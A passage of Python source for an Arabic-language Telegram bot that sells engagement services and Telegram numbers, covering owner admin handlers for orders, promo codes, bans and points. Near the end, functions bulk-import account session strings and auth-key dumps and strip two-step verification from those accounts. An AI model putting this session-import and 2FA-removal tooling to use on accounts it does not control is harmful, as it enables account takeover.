        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_order_lookup":
        code = text.strip()
        with db_conn() as c:
            o = c.execute(
                """SELECT o.*, u.full_name AS u_full_name, u.username AS u_username,
                          s.name_ar AS s_name_ar, s.category AS s_category
                   FROM orders o
                   LEFT JOIN users u ON u.user_id = o.user_id
                   LEFT JOIN services s ON s.id = o.service_id
                   WHERE o.order_code=?""",
                (code,)
            ).fetchone()
        context.user_data["state"] = "main_menu"
        if not o:
            await update.message.reply_text("⚠️ كود الطلب غير موجود.", reply_markup=owner_settings_kb())
            return
        await update.message.reply_text(
            _render_order_block(dict(o)),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    if is_own and state == "os_await_cancel_order":
        code = text.strip()
        with db_conn() as c:
            order = c.execute("SELECT * FROM orders WHERE order_code=?", (code,)).fetchone()
        if not order:
            await update.message.reply_text("⚠️ كود الطلب غير موجود.")
            context.user_data["state"] = "main_menu"
            return
        context.user_data["cancel_order"] = dict(order)
        context.user_data["state"] = "confirm_cancel_order"
        await update.message.reply_text(
            f"⚠️ *تأكيد إلغاء الطلب:*\n\n"
            f"📌 الكود: {code}\n"
            f"👤 المستخدم ID: {order['user_id']}\n"
            f"💰 التكلفة: {order['cost_points']} نقطة\n\n"
            f"أرسل *نعم* للإلغاء وإعادة الرصيد أو *لا* للتراجع",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if is_own and state == "confirm_cancel_order":
        if text == "نعم":
            order  = context.user_data.get("cancel_order", {})
            uid    = order.get("user_id")
            pts    = order.get("cost_points", 0)
            o_code = order.get("order_code")
            with db_conn() as c:
                c.execute("UPDATE orders SET status='cancelled' WHERE order_code=?", (o_code,))
            if pts:
                add_points(uid, pts)
            await update.message.reply_text(
                f"✅ تم إلغاء الطلب {o_code} وإعادة {pts} نقطة للمستخدم.",
                reply_markup=owner_settings_kb()
            )
            try:
                await context.bot.send_message(
                    uid,
                    f"🔴 تم إلغاء طلبك بكود {o_code} وإعادة *{pts}* نقطة لرصيدك.\n\n"
                    f"{LINK_ERROR_GUIDANCE}",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass
        else:
            await update.message.reply_text("❌ تم التراجع.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_complete_order":
        code = text.strip()
        with db_conn() as c:
            order = c.execute("SELECT * FROM orders WHERE order_code=?", (code,)).fetchone()
        if not order:
            await update.message.reply_text("⚠️ كود الطلب غير موجود.", reply_markup=owner_settings_kb())
            context.user_data["state"] = "main_menu"
            return
        context.user_data["complete_order"] = dict(order)
        context.user_data["state"] = "confirm_complete_order"
        await update.message.reply_text(
            f"✅ *تأكيد إكمال الطلب:*\n\n"
            f"📌 الكود: {code}\n"
            f"👤 المستخدم ID: {order['user_id']}\n\n"
            f"أرسل *نعم* لتأكيد الإكمال وإشعار المستخدم أو *لا* للتراجع",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if is_own and state == "confirm_complete_order":
        if text == "نعم":
            order  = context.user_data.get("complete_order", {})
            uid    = order.get("user_id")
            o_code = order.get("order_code")
            with db_conn() as c:
                c.execute("UPDATE orders SET status='completed' WHERE order_code=?", (o_code,))
            await update.message.reply_text(
                f"✅ تم تحديد الطلب {o_code} كمكتمل وإشعار المستخدم.",
                reply_markup=owner_settings_kb()
            )
            try:
                await context.bot.send_message(
                    uid,
                    f"🎉 تم اكتمال طلبك بكود {o_code} بنجاح!\nنتمنى أن تكون راضياً عن الخدمة 🌟"
                )
            except Exception:
                pass
        else:
            await update.message.reply_text("❌ تم التراجع.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_channel":
        channel = text.lstrip("@")
        with db_conn() as c:
            c.execute(
                "INSERT INTO mandatory_channels (channel_username,funding_type,active) VALUES (%s,'mandatory',1) "
                "ON CONFLICT (channel_username) DO UPDATE SET active=1, funding_type='mandatory'",
                (channel,)
            )
        await update.message.reply_text(f"✅ تمت إضافة القناة @{channel} بنجاح! 🎉 أحسنت.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    # ── إنشاء كود ترويجي ──
    if is_own and state == "os_await_promo_code_text":
        code = text.strip().upper()
        if len(code) < 3:
            await update.message.reply_text("⚠️ الكود يجب أن يكون 3 أحرف على الأقل.")
            return
        with db_conn() as c:
            existing = c.execute("SELECT 1 FROM promo_codes WHERE code=?", (code,)).fetchone()
        if existing:
            await update.message.reply_text("⚠️ هذا الكود موجود مسبقاً. أرسل كوداً آخر.")
            return
        context.user_data["new_promo_code"] = code
        context.user_data["state"] = "os_await_promo_uses"
        await update.message.reply_text(f"✅ الكود: `{code}`\n\nكم عدد المستخدمين الذين يمكنهم استخدامه؟",
                                        parse_mode=ParseMode.MARKDOWN)
        return

    if is_own and state == "os_await_promo_uses":
        try:
            uses = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        if uses <= 0:
            await update.message.reply_text("⚠️ يجب أن يكون أكبر من صفر.")
            return
        context.user_data["new_promo_uses"] = uses
        context.user_data["state"] = "os_await_promo_points"
        await update.message.reply_text(f"✅ الحد الأقصى: {uses} مستخدم\n\nكم عدد النقاط لكل مستخدم؟")
        return

    if is_own and state == "os_await_promo_points":
        try:
            pts = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        if pts <= 0:
            await update.message.reply_text("⚠️ يجب أن يكون أكبر من صفر.")
            return
        code  = context.user_data.get("new_promo_code")
        uses  = context.user_data.get("new_promo_uses")
        with db_conn() as c:
            c.execute("INSERT INTO promo_codes (code, max_uses, points) VALUES (?,?,?)", (code, uses, pts))
        await update.message.reply_text(
            f"✅ *تم إنشاء الكود بنجاح!*\n\n"
            f"🎟 الكود: `{code}`\n"
            f"👥 الحد الأقصى: {uses} مستخدم\n"
            f"💰 النقاط لكل مستخدم: {pts}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    # ── رسالة جماعية ──
    if is_own and state == "os_await_broadcast":
        broadcast_text = text
        with db_conn() as c:
            users = c.execute("SELECT user_id FROM users").fetchall()
        sent = 0
        failed = 0
        for u_row in users:
            try:
                await context.bot.send_message(u_row["user_id"], broadcast_text, parse_mode=ParseMode.HTML)
                sent += 1
            except Exception:
                failed += 1
        await update.message.reply_text(
            f"📢 *تم إرسال الرسالة الجماعية*\n\n✅ نجح: {sent}\n❌ فشل: {failed}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    # ── حظر عضو (مالك) ──
    if is_own and state == "os_await_ban_target":
        target = lookup_user_by_id_or_username(text)
        if not target:
            await update.message.reply_text(
                "⚠️ لم يتم إيجاد المستخدم. أرسل الـ ID الرقمي أو @يوزرنيم مسجّل في البوت.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")]]),
            )
            return
        if target["user_id"] == OWNER_ID:
            await update.message.reply_text("⚠️ لا يمكن حظر المالك.", reply_markup=owner_settings_kb())
            context.user_data["state"] = "main_menu"
            return
        if target.get("banned"):
            uname = f"@{target['username']}" if target.get("username") else f"ID: {target['user_id']}"
            await update.message.reply_text(
                f"ℹ️ *{target.get('full_name', '')}* ({uname}) محظور مسبقاً.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔓 رفع الحظر عنه", callback_data=f"os:unban_confirm:{target['user_id']}")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")],
                ]),
            )
            context.user_data["state"] = "main_menu"
            return
        context.user_data["ban_target_id"] = target["user_id"]
        context.user_data["state"] = "os_await_ban_reason"
        uname = f"@{target['username']}" if target.get("username") else f"ID: {target['user_id']}"
        await update.message.reply_text(
            f"🚫 *حظر:* {target.get('full_name', '')} ({uname})\n\n"
            "أرسل سبب الحظر (أو أرسل - لتخطي السبب):",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:ban_menu")]]),
        )
        return

    if is_own and state == "os_await_ban_reason":
        target_id = context.user_data.get("ban_target_id")
        reason = text.strip() if text.strip() != "-" else ""
        if not target_id:
            context.user_data["state"] = "main_menu"
            await update.message.reply_text("⚠️ انتهت الجلسة.", reply_markup=owner_settings_kb())
            return
        found = ban_user_db(target_id, reason)
        target = get_user(target_id)
        uname = f"@{target['username']}" if target and target.get("username") else f"ID: {target_id}"
        name  = (target.get("full_name") or "") if target else ""
        context.user_data["state"] = "main_menu"
        if found:
            await update.message.reply_text(
                f"✅ *تم حظر العضو بنجاح*\n\n"
                f"👤 {name} ({uname})\n"
                f"📝 السبب: {reason or '—'}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔓 رفع الحظر", callback_data=f"os:unban_confirm:{target_id}")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")],
                ]),
            )
        else:
            await update.message.reply_text("⚠️ المستخدم غير موجود في قاعدة البيانات.", reply_markup=owner_settings_kb())
        return

    # ── رفع حظر عضو عبر إدخال ID/username يدوياً (مالك) ──
    if is_own and state == "os_await_unban_target":
        target = lookup_user_by_id_or_username(text)
        context.user_data["state"] = "main_menu"
        if not target:
            await update.message.reply_text(
                "⚠️ لم يتم إيجاد المستخدم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")]]),
            )
            return
        if not target.get("banned"):
            uname = f"@{target['username']}" if target.get("username") else f"ID: {target['user_id']}"
            await update.message.reply_text(
                f"ℹ️ {target.get('full_name', '')} ({uname}) غير محظور.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")]]),
            )
            return
        unban_user_db(target["user_id"])
        uname = f"@{target['username']}" if target.get("username") else f"ID: {target['user_id']}"
        await update.message.reply_text(
            f"✅ *تم رفع الحظر عن:* {target.get('full_name', '')} ({uname})",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")]]),
        )
        return

    # ── بحث عن مستخدمي كود (حتى القديمة المحذوفة) — يبحث في الأكواد الترويجية وأكواد شراء الأرقام ──
    if is_own and state == "os_await_code_search":
        code = text.strip().upper()
        context.user_data["state"] = "main_menu"
        with db_conn() as c:
            promo = c.execute("SELECT * FROM promo_codes WHERE code=%s", (code,)).fetchone()
            promo_uses = c.execute(
                """
                SELECT pu.user_id, pu.used_at,
                       u.username, u.full_name, u.points
                FROM promo_uses pu
                LEFT JOIN users u ON u.user_id = pu.user_id
                WHERE pu.code = %s
                ORDER BY pu.used_at DESC NULLS LAST
                """,
                (code,)
            ).fetchall()
            # بحث في أكواد شراء الأرقام أيضاً
            num_code = c.execute("SELECT * FROM number_purchase_codes WHERE code=%s", (code,)).fetchone()
            num_code_uses = c.execute(
                """
                SELECT ncu.user_id, ncu.used_at,
                       u.username, u.full_name, u.points,
                       pe.prize_value AS number_given
                FROM number_purchase_code_uses ncu
                LEFT JOIN users u ON u.user_id = ncu.user_id
                LEFT JOIN prize_exchanges pe ON pe.user_id = ncu.user_id
                     AND pe.prize_type = 'telegram_number_code'
                     AND pe.status = 'completed'
                WHERE ncu.code = %s
                ORDER BY ncu.used_at DESC NULLS LAST
                """,
                (code,)
            ).fetchall()

        if not promo_uses and not promo and not num_code_uses and not num_code:
            await update.message.reply_text(
                f"⚠️ لا توجد سجلات لاستخدام الكود `{code}` (لا الآن ولا في السابق).",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_promos")]]),
            )
            return

        parts = []

        # ─── قسم الأكواد الترويجية ───
        if promo or promo_uses:
            if promo:
                header = (
                    f"🎟 *كود ترويجي:* `{code}`\n"
                    f"🎁 النقاط: {promo['points']} | الاستخدامات: {promo['used_count']}/{promo['max_uses']}"
                    f" | {'✅ فعّال' if promo['active'] else '❌ معطّل'}\n"
                )
            else:
                header = f"🎟 *كود ترويجي (قديم):* `{code}`\n"
            if not promo_uses:
                body = "\n_لم يستخدمه أحد._"
            else:
                lines = []
                for i, u in enumerate(promo_uses, 1):
                    name  = (u["full_name"] or "").strip() or "—"
                    uname = f"@{u['username']}" if u["username"] else f"ID: {u['user_id']}"
                    pts   = u["points"] if u["points"] is not None else "؟"
                    ts_raw = u["used_at"]
                    ts = ts_raw.strftime("%Y-%m-%d %H:%M") if ts_raw and hasattr(ts_raw, "strftime") else (str(ts_raw)[:16] if ts_raw else "—")
                    lines.append(f"{i}. {name} ({uname})\n   💰 رصيده: {pts} نقطة | 🕐 {ts}")
                body = "\n\n" + "\n\n".join(lines)
            parts.append(header + body)

        # ─── قسم أكواد شراء الأرقام ───
        if num_code or num_code_uses:
            if num_code:
                header2 = (
                    f"📱 *كود شراء رقم:* `{code}`\n"
                    f"الاستخدامات: {num_code['used_count']}/{num_code['max_uses']}"
                    f" | {'✅ فعّال' if num_code['active'] else '❌ معطّل'}\n"
                )
            else:
                header2 = f"📱 *كود شراء رقم (قديم):* `{code}`\n"
            if not num_code_uses:
                body2 = "\n_لم يستخدمه أحد._"
            else:
                lines2 = []
                for i, u in enumerate(num_code_uses, 1):
                    name  = (u["full_name"] or "").strip() or "—"
                    uname = f"@{u['username']}" if u["username"] else f"ID: {u['user_id']}"
                    num   = u["number_given"] or "—"
                    ts_raw = u["used_at"]
                    ts = ts_raw.strftime("%Y-%m-%d %H:%M") if ts_raw and hasattr(ts_raw, "strftime") else (str(ts_raw)[:16] if ts_raw else "—")
                    lines2.append(f"{i}. {name} ({uname})\n   📱 الرقم المسلَّم: `{num}` | 🕐 {ts}")
                body2 = "\n\n" + "\n\n".join(lines2)
            parts.append(header2 + body2)

        msg = f"🔍 *نتائج البحث عن الكود:* `{code}`\n\n" + "\n\n─────────────────\n\n".join(parts)
        # تقسيم الرسالة إن طالت
        chunks = [msg[i:i+4000] for i in range(0, len(msg), 4000)]
        for idx, chunk in enumerate(chunks):
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للأكواد", callback_data="os:list_promos")]]) if idx == len(chunks) - 1 else None
            await update.message.reply_text(chunk, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return

    # ── منح/خصم نقاط — الخطوة 1: استقبال المستخدم (مالك) ──
    if is_own and state == "os_await_points_target":
        target = lookup_user_by_id_or_username(text)
        if not target:
            await update.message.reply_text(
                "⚠️ لم يتم إيجاد المستخدم. أرسل ID رقمي أو @يوزرنيم:",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:manage_points")]])
            )
            return
        context.user_data["points_target_id"] = target["user_id"]
        context.user_data["state"] = "os_await_points_amount"
        mode  = context.user_data.get("points_mode", "give")
        uname = f"@{target['username']}" if target.get("username") else f"ID: {target['user_id']}"
        verb  = "منح" if mode == "give" else "خصم"
        await update.message.reply_text(
            f"{'➕' if mode == 'give' else '➖'} *{verb} نقاط لـ:* {md_escape(target.get('full_name',''))} ({md_escape(uname)})\n"
            f"💰 رصيده الحالي: *{target.get('points', 0)}* نقطة\n\n"
            f"أرسل عدد النقاط المراد {'منحها' if mode == 'give' else 'خصمها'}:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:manage_points")]])
        )
        return

    # ── منح/خصم نقاط — الخطوة 2: استقبال الكمية (مالك) ──
    if is_own and state == "os_await_points_amount":
        try:
            amount = int(text.strip())
            if amount <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً أكبر من صفر.")
            return
        target_id = context.user_data.get("points_target_id")
        mode      = context.user_data.get("points_mode", "give")
        context.user_data["state"] = "main_menu"
        if not target_id:
            await update.message.reply_text("⚠️ انتهت الجلسة.", reply_markup=owner_settings_kb())
            return
        target = get_user(target_id)
        uname  = f"@{target['username']}" if target and target.get("username") else f"ID: {target_id}"
        if mode == "give":
            add_points(target_id, amount)
            new_bal = (target.get("points") or 0) + amount
            await update.message.reply_text(
                f"✅ *تم منح {amount} نقطة*\n\n"
                f"👤 {md_escape(target.get('full_name','') if target else '')} ({md_escape(uname)})\n"
                f"💰 الرصيد الجديد: *{new_bal}* نقطة",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_points")]])
            )
            try:
                await context.bot.send_message(target_id, f"🎁 تم إضافة *{amount}* نقطة إلى رصيدك من قبل الإدارة.\n💰 رصيدك الآن: *{new_bal}* نقطة", parse_mode=ParseMode.MARKDOWN)
            except Exception:
                pass
        else:
            actual = deduct_points_clamped(target_id, amount)
            new_bal = max(0, (target.get("points") or 0) - actual)
            if actual == 0:
                await update.message.reply_text(
                    f"⚠️ رصيد العضو صفر — لم يُخصم شيء.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_points")]])
                )
            else:
                await update.message.reply_text(
                    f"✅ *تم خصم {actual} نقطة*\n\n"
                    f"👤 {md_escape(target.get('full_name','') if target else '')} ({md_escape(uname)})\n"
                    f"💰 الرصيد الجديد: *{new_bal}* نقطة",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_points")]])
                )
                try:
                    await context.bot.send_message(target_id, f"⚠️ تم خصم *{actual}* نقطة من رصيدك من قبل الإدارة.\n💰 رصيدك الآن: *{new_bal}* نقطة", parse_mode=ParseMode.MARKDOWN)
                except Exception:
                    pass
        return

    # ── إضافة باقة استبدال نجوم (مالك) ──
    if is_own and state == "os_await_pkg_stars":
        try:
            stars = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        if stars <= 0:
            await update.message.reply_text("⚠️ يجب أن يكون أكبر من صفر.")
            return
        with db_conn() as c:
            c.execute("INSERT INTO exchange_star_packages (stars) VALUES (?)", (stars,))
        rate = int(get_setting("exchange_star_rate") or "2000")
        cost = stars * rate
        await update.message.reply_text(
            f"✅ *تمت إضافة الباقة بنجاح!*\n\n⭐ {stars} نجمة = {cost} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    # ── تعديل خدمة موجودة (مالك) ──
    if is_own and state == "os_edit_await_name":
        sid = context.user_data.get("edit_svc_id")
        with db_conn() as c:
            c.execute("UPDATE services SET name_ar=? WHERE id=?", (text, sid))
        context.user_data["state"] = "main_menu"
        await update.message.reply_text(f"✅ تم تحديث اسم الخدمة إلى: *{text}*", parse_mode=ParseMode.MARKDOWN,
                                         reply_markup=owner_settings_kb())
        return

    if is_own and state == "os_edit_await_min":
        try:
            mn = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        sid = context.user_data.get("edit_svc_id")
        with db_conn() as c:
            c.execute("UPDATE services SET min_qty=? WHERE id=?", (mn, sid))
        context.user_data["state"] = "main_menu"
        await update.message.reply_text(f"✅ تم تحديث الحد الأدنى إلى: {mn}", reply_markup=owner_settings_kb())
        return

    if is_own and state == "os_edit_await_max":
        try:
            mx = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        sid = context.user_data.get("edit_svc_id")
        with db_conn() as c:
            c.execute("UPDATE services SET max_qty=? WHERE id=?", (mx, sid))
        context.user_data["state"] = "main_menu"
        await update.message.reply_text(f"✅ تم تحديث الحد الأعلى إلى: {mx}", reply_markup=owner_settings_kb())
        return

    if is_own and state == "os_edit_await_price":
        try:
            price = float(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        sid = context.user_data.get("edit_svc_id")
        with db_conn() as c:
            c.execute("UPDATE services SET price_per_point=? WHERE id=?", (price, sid))
        context.user_data["state"] = "main_menu"
        await update.message.reply_text(f"✅ تم تحديث السعر إلى: {fmt_price(price)} نقطة/1000 وحدة", reply_markup=owner_settings_kb())
        return

    if is_own and state == "os_edit_await_desc":
        sid = context.user_data.get("edit_svc_id")
        if text.strip() == "-":
            new_desc = None
        else:
            # جلب سعر الخدمة الحالي لفحص الوصف
            with db_conn() as c:
                svc_row = c.execute("SELECT price_per_point FROM services WHERE id=%s", (sid,)).fetchone()
            ppp = float(svc_row["price_per_point"] or 0) if svc_row else 0.0
            raw = text.strip()
            new_desc = _strip_price_from_desc(raw, ppp)
        with db_conn() as c:
            c.execute("UPDATE services SET description=%s WHERE id=%s", (new_desc, sid))
        context.user_data["state"] = "main_menu"
        if new_desc and new_desc != text.strip() and text.strip() != "-":
            msg = f"✅ تم حذف السعر من الوصف تلقائياً.\nالوصف بعد التنظيف:\n{new_desc}"
        elif new_desc is None and text.strip() != "-":
            msg = "⚠️ تم حذف الوصف كاملاً لأنه لم يتبق سوى السعر."
        elif new_desc is None:
            msg = "✅ تم حذف الوصف."
        else:
            msg = f"✅ تم تحديث الوصف إلى:\n{new_desc}"
        await update.message.reply_text(msg, reply_markup=owner_settings_kb())
        return

    if is_own and state == "os_edit_await_apiid":
        try:
            api_id = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        sid   = context.user_data.get("edit_svc_id")
        panel = context.user_data.get("edit_svc_panel", 1)
        info = smm_service_info(api_id, panel=panel)
        if not info:
            site_name = PANEL_MAP.get(panel, PANEL_MAP[1])["name"]
            await update.message.reply_text(f"⚠️ لم يتم العثور على الخدمة في موقع {site_name}. تأكد من الرقم.")
            return
        with db_conn() as c:
            c.execute("UPDATE services SET api_service_id=?, panel=? WHERE id=?", (api_id, panel, sid))
        context.user_data["state"] = "main_menu"
        site_name = PANEL_MAP.get(panel, PANEL_MAP[1])["name"]
        await update.message.reply_text(
            f"✅ تم ربط الخدمة برقم *{api_id}* من موقع {site_name}.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    # إذا لا يوجد حالة معروفة، عرض القائمة
    await update.message.reply_text("🏠 القائمة الرئيسية:", reply_markup=main_menu_kb(is_own))


async def _remove_2fa_from_session(session_string: str) -> tuple[bool, str, str | None]:
    """
    يزيل التحقق بخطوتين (2FA) من حساب باستخدام جلسة تيلثون.
    الترتيب:
      1. يجرب كلمة المرور المخزّنة في قاعدة البيانات (إن عُرف رقم الهاتف).
      2. يجرب كلمة المرور الثابتة للمالك (OWNER_FIXED_2FA_PASSWORD).
      3. إن فشل الاثنان يُعيد الفشل مع رقم الهاتف.
    يُرجع (success, message, phone_or_None).
    """
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return False, "TELEGRAM_API_ID/HASH غير مضبوط", None

    client = TelegramClient(StringSession(session_string), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
    phone = None
    try:
        await asyncio.wait_for(client.connect(), timeout=20)
        if not await asyncio.wait_for(client.is_user_authorized(), timeout=10):
            await client.disconnect()
            return False, "الجلسة منتهية أو غير صالحة", None

        me = await client.get_me()
        phone = f"+{me.phone}" if me and me.phone and not str(me.phone).startswith("+") else (me.phone if me else None)

        # هل هناك 2FA أصلاً؟
        pwd_state = await client(GetPasswordRequest())
        if not pwd_state.has_password:
            await client.disconnect()
            return True, "✅ لا يوجد تحقق ثنائي على هذا الحساب أصلاً", phone

        # جمع كلمات المرور المحتملة للمحاولة
        candidates: list[str] = []
        if phone:
            with db_conn() as _dc:
                _row = _dc.execute(
                    "SELECT twofa_password FROM number_stock WHERE phone_number=%s AND twofa_password IS NOT NULL",
                    (phone,)
                ).fetchone()
            if _row and _row["twofa_password"]:
                candidates.append(_row["twofa_password"])
        if OWNER_FIXED_2FA_PASSWORD and OWNER_FIXED_2FA_PASSWORD not in candidates:
            candidates.append(OWNER_FIXED_2FA_PASSWORD)

        removed = False
        for pw in candidates:
            try:
                _expected_2fa_change[phone or ""] = time.time()
                await client.edit_2fa(current_password=pw, new_password="")
                removed = True
                # تنظيف DB — لم تعد كلمة المرور صالحة
                if phone:
                    with db_conn() as _uc:
                        _uc.execute(
                            "UPDATE number_stock SET twofa_password=NULL, auto_2fa_enabled=FALSE WHERE phone_number=%s",
                            (phone,)
                        )
                break
            except Exception as _pe:
                err = str(_pe).upper()
                if "PASSWORD_HASH_INVALID" in err or "SRP_ID_INVALID" in err:
                    continue  # كلمة المرور خاطئة، جرّب التالية
                # خطأ آخر (شبكة، حد معدل...)
                await client.disconnect()
                return False, f"❌ خطأ أثناء الإزالة: {_pe}", phone

        await client.disconnect()
        if removed:
            return True, "✅ تم إزالة التحقق الثنائي بنجاح", phone
        else:
            return False, "❌ كلمة المرور غير معروفة — أرسل كلمة المرور الصحيحة نصاً بعد الملف", phone

    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        return False, f"❌ خطأ: {e}", phone


async def handle_json_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """يستقبل ملف JSON من المالك ويستورد الجلسات المحتواة فيه مباشرة."""
    user = update.effective_user
    if user.id != OWNER_ID:
        return
    doc = update.message.document
    if not doc:
        return
    msg = await update.message.reply_text("⏳ جاري قراءة الملف...")
    try:
        file = await context.bot.get_file(doc.file_id)
        raw_bytes = await file.download_as_bytearray()
        import json as _json
        data = _json.loads(raw_bytes.decode("utf-8"))
    except Exception as e:
        await msg.edit_text(f"❌ تعذّر قراءة الملف:\n`{e}`", parse_mode=ParseMode.MARKDOWN)
        return

    # نقبل: dict واحد أو list من dicts أو list من strings
    # بما في ذلك صيغة Pyrogram JSON (dc_id + auth_key)
    if isinstance(data, dict):
        data = [data]
    elif isinstance(data, str):
        data = [{"session_string": data}]

    sessions = []
    for item in data:
        if isinstance(item, str):
            sessions.append({"session": _maybe_convert_session(item.strip()), "phone": None})
        elif isinstance(item, dict):
            # ── صيغة Pyrogram JSON (dc_id + auth_key hex) ──
            if "dc_id" in item and "auth_key" in item:
                converted = pyrogram_json_to_telethon(item)
                if converted:
                    phone = (
                        item.get("phone") or
                        item.get("phone_number") or
                        item.get("mobile") or None
                    )
                    sessions.append({"session": converted, "phone": phone})
                continue
            # ── صيغة Telethon StringSession العادية ──
            sess = (
                item.get("session_string") or
                item.get("session") or
                item.get("string_session") or ""
            ).strip()
            phone = (
                item.get("phone") or
                item.get("phone_number") or
                item.get("mobile") or None
            )
            if sess:
                sessions.append({"session": _maybe_convert_session(sess), "phone": phone})

    if not sessions:
        await msg.edit_text("❌ لم أجد أي جلسة صالحة في الملف. تأكد أن الملف يحتوي حقل `session_string` أو حقلي `dc_id` و`auth_key` (صيغة Pyrogram).")
        return

    # ── وضع إزالة التحقق الثنائي ──
    if context.user_data.get("state") == "os_remove_2fa_mode":
        await msg.edit_text(f"⏳ جاري إزالة التحقق من {len(sessions)} حساب...")
        ok_list, fail_list = [], []
        for idx, entry in enumerate(sessions):
            ok, result_msg, phone = await _remove_2fa_from_session(entry["session"])
            label = phone or entry["phone"] or f"#{idx+1}"
            if ok:
                ok_list.append(f"`{label}` — {result_msg}")
            else:
                fail_list.append(f"`{label}` — {result_msg}")
        lines = [f"🔓 *نتيجة إزالة التحقق ({len(sessions)} حساب):*\n"]
        if ok_list:
            lines.append(f"✅ *نجح ({len(ok_list)}):*")
            lines.extend(f"  • {x}" for x in ok_list)
        if fail_list:
            lines.append(f"\n❌ *فشل ({len(fail_list)}):*")
            lines.extend(f"  • {x}" for x in fail_list[:20])
            if len(fail_list) > 20:
                lines.append(f"  ... و{len(fail_list)-20} أخرى")
        await msg.edit_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)
        return

    await msg.edit_text(f"⏳ تم العثور على {len(sessions)} جلسة، جاري التحقق والاستيراد...")
    ok_list, fail_list = [], []

    for idx, entry in enumerate(sessions):
        sess  = entry["session"]
        phone_hint = entry["phone"]
        try:
            if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
                fail_list.append(phone_hint or f"#{idx+1}")
                continue
            client = TelegramClient(StringSession(sess), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                await client.disconnect()
                fail_list.append(phone_hint or f"#{idx+1}: جلسة منتهية")
                continue
            me = await client.get_me()
            phone = me.phone if me.phone.startswith("+") else f"+{me.phone}"
            await client.disconnect()
            with db_conn() as _c:
                exists = _c.execute(
                    "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
                ).fetchone()
                if exists:
                    _c.execute(
                        "UPDATE number_stock SET session_string=%s, assigned_to=NULL, assigned_at=NULL WHERE phone_number=%s",
                        (sess, phone)
                    )
                else:
                    _c.execute(
                        "INSERT INTO number_stock (phone_number, session_string) VALUES (%s,%s)",
                        (phone, sess)
                    )
            asyncio.create_task(_start_number_monitor(phone, sess, context.application))
            ok_list.append(phone)
        except Exception as _e:
            fail_list.append(phone_hint or f"#{idx+1}: {_e}")

    lines = [f"✅ *تم استيراد {len(ok_list)} حساب بنجاح:*"]
    for p in ok_list:
        lines.append(f"  • `{p}`")
    if fail_list:
        lines.append(f"\n❌ *فشل {len(fail_list)}:*")
        for f_ in fail_list[:20]:
            lines.append(f"  • {f_}")
        if len(fail_list) > 20:
            lines.append(f"  ... و{len(fail_list)-20} أخرى")
    await msg.edit_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


